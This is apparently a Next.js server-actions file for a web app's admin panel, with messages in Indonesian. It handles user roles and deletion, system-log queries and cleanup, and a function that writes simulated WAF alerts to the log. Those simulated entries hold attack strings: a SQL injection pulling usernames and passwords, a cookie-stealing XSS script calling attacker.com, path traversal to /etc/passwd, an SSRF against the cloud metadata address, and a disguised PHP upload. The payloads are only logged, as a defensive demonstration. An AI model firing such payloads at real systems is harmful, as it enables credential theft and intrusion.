"use server";

import { prisma } from "@/lib/prisma";
import { getServerSession } from "next-auth";
import { authOptions } from "@/app/api/auth/[...nextauth]/route";
import { revalidatePath } from "next/cache";
import { Role, LogType, LogSeverity, Prisma } from "@prisma/client";
import {
  logServerEvent,
  logWafEvent,
  getServerSystemMetrics,
} from "@/lib/system-logger";
import { cleanupExpiredImages } from "@/lib/cleanup";

async function verifyAdminSession() {
  const session = await getServerSession(authOptions);
  if (!session || session.user.role !== "ADMIN") {
    throw new Error("Akses ditolak: Hanya Administrator yang diizinkan.");
  }
  return session;
}

export async function changeUserRoleAction(userId: string, newRole: Role) {
  try {
    const session = await verifyAdminSession();

    if (userId === session.user.id) {
      return { success: false, message: "Tidak dapat mengubah role akun admin sendiri." };
    }

    const targetUser = await prisma.user.findUnique({
      where: { id: userId },
      select: { username: true, role: true },
    });

    await prisma.user.update({
      where: { id: userId },
      data: { role: newRole },
    });

    await logServerEvent({
      severity: "WARN",
      action: "ADMIN_ROLE_CHANGE",
      message: `Admin '${session.user.username}' mengubah role user '${targetUser?.username}' dari ${targetUser?.role} ke ${newRole}`,
      endpoint: "ServerAction:changeUserRoleAction",
      userId: session.user.id,
      metadata: {
        targetUserId: userId,
        targetUsername: targetUser?.username,
        oldRole: targetUser?.role,
        newRole,
      },
    });

    revalidatePath("/admin");
    return { success: true, message: `Role pengguna berhasil diubah ke ${newRole}!` };
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Terjadi kesalahan saat mengubah role.";
    return { success: false, message: msg };
  }
}

export async function deleteUserAction(userId: string) {
  try {
    const session = await verifyAdminSession();

    if (userId === session.user.id) {
      return { success: false, message: "Tidak dapat menghapus akun admin sendiri." };
    }

    const targetUser = await prisma.user.findUnique({
      where: { id: userId },
      select: { username: true, role: true },
    });

    await prisma.user.delete({
      where: { id: userId },
    });

    await logServerEvent({
      severity: "CRITICAL",
      action: "ADMIN_DELETE_USER",
      message: `Admin '${session.user.username}' menghapus permanen akun user '${targetUser?.username}' (Role: ${targetUser?.role})`,
      endpoint: "ServerAction:deleteUserAction",
      userId: session.user.id,
      metadata: {
        deletedUserId: userId,
        deletedUsername: targetUser?.username,
        deletedRole: targetUser?.role,
      },
    });

    revalidatePath("/admin");
    return { success: true, message: "Akun pengguna berhasil dihapus dari platform." };
  } catch (error: unknown) {
    console.error("Gagal menghapus user:", error);
    return { success: false, message: "Gagal menghapus akun (mungkin terkait relasi pesanan aktif)." };
  }
}

export interface GetLogsParams {
  type?: LogType | "ALL";
  severity?: LogSeverity | "ALL";
  action?: string;
  search?: string;
  page?: number;
  limit?: number;
}

export async function getLogsAction(params: GetLogsParams = {}) {
  try {
    await verifyAdminSession();

    const {
      type = "ALL",
      severity = "ALL",
      action,
      search,
      page = 1,
      limit = 25,
    } = params;

    const where: Prisma.SystemLogWhereInput = {};

    if (type !== "ALL") {
      where.type = type;
    }

    if (severity !== "ALL") {
      where.severity = severity;
    }

    if (action && action.trim() !== "") {
      where.action = { contains: action.trim(), mode: "insensitive" };
    }

    if (search && search.trim() !== "") {
      const q = search.trim();
      where.OR = [
        { message: { contains: q, mode: "insensitive" } },
        { action: { contains: q, mode: "insensitive" } },
        { ipAddress: { contains: q, mode: "insensitive" } },
        { endpoint: { contains: q, mode: "insensitive" } },
      ];
    }

    const skip = (Math.max(1, page) - 1) * limit;

    const [total, logs] = await Promise.all([
      prisma.systemLog.count({ where }),
      prisma.systemLog.findMany({
        where,
        orderBy: { createdAt: "desc" },
        skip,
        take: limit,
      }),
    ]);

    return {
      success: true,
      logs: logs.map((l) => ({
        ...l,
        createdAt: l.createdAt.toISOString(),
      })),
      total,
      page,
      totalPages: Math.ceil(total / limit),
    };
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Gagal mengambil log sistem.";
    return { success: false, error: msg, logs: [], total: 0, page: 1, totalPages: 0 };
  }
}

export async function getServerMetricsAction() {
  try {
    await verifyAdminSession();
    const metrics = await getServerSystemMetrics();
    return { success: true, metrics };
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Gagal mengambil metrik server.";
    return { success: false, error: msg };
  }
}

export async function clearOldLogsAction(daysToKeep = 7) {
  try {
    const session = await verifyAdminSession();

    const cutoffDate = new Date(Date.now() - daysToKeep * 24 * 60 * 60 * 1000);

    const deleted = await prisma.systemLog.deleteMany({
      where: {
        createdAt: { lt: cutoffDate },
      },
    });

    await logServerEvent({
      severity: "INFO",
      action: "ADMIN_CLEAR_LOGS",
      message: `Admin '${session.user.username}' membersihkan ${deleted.count} log sistem yang lebih lama dari ${daysToKeep} hari.`,
      userId: session.user.id,
      metadata: { deletedCount: deleted.count, daysToKeep },
    });

    revalidatePath("/admin");
    return {
      success: true,
      message: `Berhasil membersihkan ${deleted.count} log yang berumur lebih dari ${daysToKeep} hari.`,
      deletedCount: deleted.count,
    };
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Gagal membersihkan log.";
    return { success: false, message: msg };
  }
}

export async function triggerManualCronCleanupAction() {
  try {
    const session = await verifyAdminSession();

    const result = await cleanupExpiredImages(100);

    await logServerEvent({
      severity: "INFO",
      action: "MANUAL_CRON_CLEANUP",
      message: `Admin '${session.user.username}' memicu pembersihan foto kadaluarsa secara manual.`,
      userId: session.user.id,
      metadata: { ...result },
    });

    revalidatePath("/admin");
    return {
      success: true,
      message: `Pembersihan berhasil! Dihapus: ${result.deletedProducts} produk, Diarsipkan: ${result.archivedProducts} produk, Foto pesanan: ${result.cleanedOrders}.`,
      result,
    };
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Gagal menjalankan pembersihan.";
    return { success: false, message: msg };
  }
}

export async function simulateWafAttackAction(attackType: string) {
  try {
    const session = await verifyAdminSession();

    let action = "WAF_SIMULATED_ATTACK";
    let severity: LogSeverity = "ALERT";
    let message = "Simulasi pengujian deteksi WAF";
    let endpoint = "/api/v1/search";
    let metadata: Record<string, unknown> = { attackType, simulatedBy: session.user.username };

    switch (attackType) {
      case "SQLI":
        action = "SQL_INJECTION_DETECTED";
        severity = "CRITICAL";
        endpoint = "/api/products?search=' UNION SELECT username, password FROM users --";
        message = "Injeksi SQL terdeteksi dalam kueri parameter URL: Pola 'UNION SELECT' diblokir oleh WAF.";
        metadata = { payload: "' UNION SELECT username, password FROM users --", threat: "CWE-89: SQL Injection" };
        break;

      case "XSS":
        action = "XSS_ATTACK_DETECTED";
        severity = "ALERT";
        endpoint = "/restoran/katalog?query=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>";
        message = "Cross-Site Scripting (XSS) payload terdeteksi dalam parameter pencarian dan dinetralkan oleh WAF.";
        metadata = { payload: "<script>alert(document.cookie)</script>", threat: "CWE-79: Reflected XSS" };
        break;

      case "PATH_TRAVERSAL":
        action = "PATH_TRAVERSAL_ATTACK";
        severity = "CRITICAL";
        endpoint = "/public/uploads/../../../../etc/passwd";
        message = "Percobaan Path Traversal (Directory Traversal) diblokir: Percobaan pembacaan berkas sistem root.";
        metadata = { targetFile: "/etc/passwd", pathPattern: "../", threat: "CWE-22: Path Traversal" };
        break;

      case "RATE_LIMIT":
        action = "RATE_LIMIT_EXCEEDED";
        severity = "WARN";
        endpoint = "ServerAction:placeOrderAction";
        message = "Batas laju kueri terlampaui (15 request / 10 detik). IP pengirim ditahan sementara (HTTP 429 Too Many Requests).";
        metadata = { limit: 10, currentHits: 16, retryAfterSeconds: 60, threat: "OWASP A04: DoS / Brute Force Flooding" };
        break;

      case "MAGIC_BYTES":
        action = "MAGIC_BYTES_REJECTED";
        severity = "ALERT";
        endpoint = "ServerAction:uploadHarvestImage";
        message = "Berkas 'exploit.php.jpg' ditolak: Ekstensi manipulatif JPG namun header biner asli bukan JPEG/PNG/WEBP (MIME Spoofing).";
        metadata = { fileName: "exploit.php.jpg", headerHex: "3C 3F 70 68 70", threat: "OWASP A08: Malicious File Upload" };
        break;

      case "SSRF":
        action = "SSRF_ATTEMPT_BLOCKED";
        severity = "CRITICAL";
        endpoint = "/api/fetch-webhook?target=http://169.254.169.254/latest/meta-data/";
        message = "Percobaan SSRF ke Cloud Metadata AWS/GCP (169.254.169.254) diblokir secara otomatis oleh SSRF Guard.";
        metadata = { targetUrl: "http://169.254.169.254/latest/meta-data/", threat: "CWE-918: Server-Side Request Forgery" };
        break;

      default:
        action = "WAF_PROBE_BLOCKED";
        severity = "WARN";
        message = "Pengujian keamanan WAF umum berhasil dicatat.";
    }

    const newLog = await logWafEvent({
      severity,
      action,
      message,
      endpoint,
      method: "POST",
      ipAddress: "203.0.113.195 (Simulated Attacker IP)",
      userAgent: "Mozilla/5.0 (Kali Linux; SecurityAuditScanner/1.0)",
      userId: session.user.id,
      metadata,
    });

    revalidatePath("/admin");
    return {
      success: true,
      message: `Simulasi serangan '${attackType}' berhasil dipicu dan dicatat oleh WAF!`,
      log: newLog ? { ...newLog, createdAt: newLog.createdAt.toISOString() } : null,
    };
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : "Gagal memicu simulasi.";
    return { success: false, message: msg };
  }
}
